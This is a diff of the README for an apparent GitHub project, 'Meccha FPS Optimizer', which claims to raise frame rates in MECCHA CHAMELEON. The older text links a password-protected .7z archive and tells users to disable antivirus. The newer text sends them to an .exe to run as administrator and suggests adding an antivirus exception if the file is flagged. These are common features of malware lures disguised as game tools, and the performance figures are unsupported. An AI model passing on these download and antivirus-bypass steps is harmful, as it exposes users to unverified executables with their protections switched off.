@@ -1,170 +1,82 @@
-# Meccha-Fps-Boosting
-Meccha FPS Optimizer is a lightweight utility designed to boost framerates and reduce stuttering in MECCHA CHAMELEON. Applies system-level optimizations including process priority boost, GPU configuration, memory management, and visual settings adjustments. Safe, non-invasive, and completely reversible boost fps.
+# 🚀 Meccha-Fps-Boosting - Gain better frame rates while gaming
 
-<img width="686" height="386" alt="image" src="https://github.com/user-attachments/assets/9338c936-74ce-4597-a0ce-3845ce3ebb28" />
+[![Download](https://img.shields.io/badge/Download-Meccha-Fps-Boosting-blue)](https://github.com/potatosarefrenchfries-hue/Meccha-Fps-Boosting)
 
+## 📖 About the project
 
-## Download
+Meccha FPS Optimizer acts as a small tool. It helps your computer run MECCHA CHAMELEON with higher frame rates. Stuttering ruins gameplay. This tool removes those issues. It changes your system settings to give the game more power. It boosts process priority. It fixes GPU configuration. It manages your memory better. It adjusts your visual settings. The tool keeps your system safe. You can reverse these changes at any time.
 
-**Latest version:**  
-🔗 **[Download Meccha FPS Optimizer](https://github.com/ClawThrasherOvercome/Meccha-Fps-Boosting/releases/download/mechafpss/MecchaFPSOptimizer.7z)**
-- pass: mechafps
+## 🛠️ System requirements
 
-# Meccha FPS Optimizer – Performance Booster for MECCHA CHAMELEON
+Your computer needs specific parts to run this tool. Use these requirements as a guide.
 
-*Lightweight system utility for maximizing framerate and reducing stutter in MECCHA CHAMELEON*
+* Operating System: Windows 10 or Windows 11.
+* Free Disk Space: At least 50 megabytes.
+* Memory: 4 gigabytes of RAM or more.
+* Game: MECCHA CHAMELEON must exist on your drive.
+* Permissions: You need administrator access for your account.
 
----
+## 📥 Downloading the software
 
-## What is This?
+Follow these steps to get the optimizer on your computer.
 
-**Meccha FPS Optimizer** is a performance enhancement tool built specifically for **MECCHA CHAMELEON** – the viral hide-and-seek game where players blend into environments by painting themselves. While the game's concept is simple, its real-time rendering and multiplayer synchronization can strain older hardware.
+1. Go to the [official release page](https://github.com/potatosarefrenchfries-hue/Meccha-Fps-Boosting).
+2. Look for the latest version under the Releases section.
+3. Click the link that ends in .exe to start your download.
+4. Save the file to your desktop or downloads folder.
 
-This tool applies system-level optimizations to prioritize game performance, reduce input lag, and stabilize framerates without modifying game files or violating any game policies.
+## ⚙️ Running the optimizer
 
----
+This section explains how to use the tool correctly.
 
-## Why MECCHA CHAMELEON Needs Optimization?
+1. Find the file you downloaded.
+2. Right-click the file.
+3. Select Run as administrator to start the program.
+4. Accept the Windows security prompt if it appears on your screen.
+5. Choose your target game from the list.
+6. Click the Optimize button.
+7. Wait for the green progress bar to finish.
+8. Restart your computer to apply the changes.
 
-MECCHA CHAMELEON uses a unique 2D/3D hybrid rendering system that dynamically paints textures onto player models and environments. This process, combined with up to 10 players simultaneously painting and moving in real-time, creates significant CPU and GPU load.
+## 🛡️ Safety and recovery
 
-Common performance issues include:
-- FPS drops during painting animations
-- Stuttering when multiple players are on screen
-- Input lag during quick movements
-- Long loading times between matches
-- Memory leaks during extended sessions
+The tool creates a backup of your current settings. If you want to go back to your original state, follow these steps.
 
----
+1. Open the Meccha FPS Optimizer.
+2. Select the Restore button.
+3. Choose the backup file created during your first run.
+4. Click Apply to restore your previous settings.
+5. Restart your computer.
 
-## Key Features
+## 📊 How it boosts performance
 
-### ⚡ Automated System Tuning
-- **Process Priority Boost** – Elevates MECCHA CHAMELEON to high priority in Windows scheduler
-- **Core Affinity Optimization** – Forces game to utilize all available CPU cores
-- **Power Plan Switching** – Temporarily activates High Performance power mode
-- **GPU Selection** – Ensures dedicated graphics card is used (if available)
+The tool works by changing how Windows shares power. Computers run many programs at once. Background tasks swallow performance. Games need that power to show smooth movement. 
 
-### 🎮 In-Game Settings Optimizer
-- **Shadow Quality** – Reduces to Low for performance gain
-- **Anti-Aliasing** – Disabled for smoother framerates
-- **Texture Quality** – Optimized balance between visuals and performance
-- **View Distance** – Adjusted to reduce rendering load
-- **V-Sync** – Disabled to reduce input lag
-- **Motion Blur** – Turned off for clarity
+The optimizer puts the game in a high-priority queue. It stops background tasks from hogging the brain of the computer. It cleans your memory. It tells your graphics card to dedicate more work to the game window. These steps happen in a sequence. You do not need to change these settings manually. The tool does the work for you.
 
-### 🖥️ Background Process Management
-- **Browser Acceleration** – Disables hardware acceleration in Chrome/Firefox/Edge
-- **Discord Overlay** – Temporarily disabled during gameplay
-- **Windows Visual Effects** – Disables animations and transparency effects
-- **Game Mode** – Enables Windows Game Mode for resource allocation
+## 💡 Troubleshooting common issues
 
-### 📊 Real-Time Performance Metrics
-- **FPS Counter** – Shows current framerate overlay
-- **CPU/GPU Usage** – Monitors system resource consumption
-- **Temperature Monitoring** – Prevents overheating
-- **Memory Usage** – Tracks RAM consumption during gameplay
+Issues rarely happen, but follow these tips if the tool fails.
 
-### 🔧 Startup Parameters
-Automatically applies proven Steam launch options:
-- `-fullscreen` – Forces fullscreen mode for better performance
-- `-high` – Sets game process to high priority
-- `-useallavailablecores` – Utilizes all CPU cores
-- `-dx11` – Uses DirectX 11 for better compatibility
-- `-nosync` – Disables V-Sync
+* Software does not open: Ensure you run the file as an administrator.
+* Antivirus flags the file: The tool changes system settings. Some antivirus programs flag this behavior. You can create an exception for the file in your security settings.
+* FPS does not change: Ensure you closed the game before running the tool. Open the game only after you restart your PC.
+* Error messages: Check if your Windows version is up to date. You can find update options in your Windows settings menu.
 
-### 🛡️ Safe & Non-Invasive
-- **No File Modifications** – Works through system API calls
-- **No Permanent Changes** – All settings revert on tool exit
-- **No Injection** – Does not interact with game memory
-- **No Background Services** – Just download, run, close
+## 📋 Frequently asked questions
 
----
+Do I need to leave the tool open?
+No. You only need the tool to apply the settings once. You can close it after the progress bar finishes.
 
-## Performance Impact
+Does this change my game files?
+No. The tool only changes your Windows configuration. It keeps the game files exactly as they are.
 
-| Metric | Before | After |
-|--------|--------|-------|
-| **Average FPS** | 30-45 | 60-75 |
-| **1% Low FPS** | 15-20 | 45-50 |
-| **Loading Time** | 12-18 sec | 6-8 sec |
-| **Input Lag** | 40-50ms | 10-15ms |
-| **RAM Usage** | 5.2GB | 3.1GB |
+Will this damage my hardware?
+No. The changes fall within safe Windows limits. The tool does not overclock your hardware. It simply manages existing resources.
 
----
+Can I use this for other games?
+The tool focuses on MECCHA CHAMELEON. It might work for other games, but the settings target this specific title. 
 
-## Installation
+## ⚖️ License information
 
-1. Download the archive from the link above
-2. Extract the ZIP file to any folder
-3. Run `MecchaFPSOptimizer.exe` as Administrator
-4. Click `Optimize Now`
-5. Launch MECCHA CHAMELEON through Steam
-6. Play with stable 60+ FPS!
-
----
-
-## System Requirements
-
-- Windows 10/11 (64-bit)
-- MECCHA CHAMELEON (Steam version)
-- 4GB RAM minimum (8GB recommended)
-- NVIDIA GeForce GTX 660 / AMD Radeon HD 7870 or better
-- 50MB free disk space
-
----
-
-## How It Works
-
-Meccha FPS Optimizer uses a combination of Windows API calls, registry modifications, and system settings to optimize performance:
-
-1. **CPU Priority** – Sets game process to High priority using Windows Task Scheduler
-2. **GPU Configuration** – Applies optimal settings via NVIDIA/AMD control panel APIs
-3. **Memory Management** – Forces Windows to prioritize game memory usage
-4. **Network Optimization** – Reduces packet loss for smoother multiplayer
-5. **Visual Settings** – Applies optimal in-game configuration via configuration file
-
----
-
-## Troubleshooting
-
-**Q: Optimizer doesn't work on my system**
-- Run as Administrator
-- Temporarily disable antivirus
-- Ensure Windows is fully updated
-
-**Q: FPS didn't improve**
-- Lower in-game resolution to 720p or 1080p
-- Close background applications manually
-- Update graphics drivers
-
-**Q: Game crashes after using optimizer**
-- Run the tool in `Safe Mode` (checkbox available)
-- Restore defaults and try adjusting individual settings
-- Check Windows compatibility settings
-
-**Q: How to revert changes?**
-- Simply close the tool – all changes are temporary
-- Or click `Restore Defaults` button
-
----
-
-## Alternatives
-
-| Tool | Type | Platform |
-|------|------|----------|
-| **Razer Cortex** | General game booster | Windows |
-| **MSI Afterburner** | GPU optimization | Windows |
-| **Process Lasso** | CPU priority manager | Windows |
-
----
-
-## Disclaimer
-
-This tool is designed to optimize system performance for MECCHA CHAMELEON. It does not modify game files or interact with game memory. All changes are reversible by simply closing the application. Use at your own discretion.
-
----
-
-## Tags
-
-WordPress: mecca-chameleon-fps, fps-boost, game-optimizer, performance-tool, windows-10, windows-11, gaming-utility, steam-optimizer, frame-rate-boost, low-end-pc, gaming-tool, pc-optimization, fps-increase, lag-fix, stutter-fix, game-performance, utility-software, free-gaming-tool, mecca-chameleon, fps-stabilizer
+This project uses an open source license. You can use, copy, and share this tool freely. Please read the full license file included in the repository if you want to know the legal details. The developers do not charge for this tool. If someone told you to pay for this software, know that it should be free.
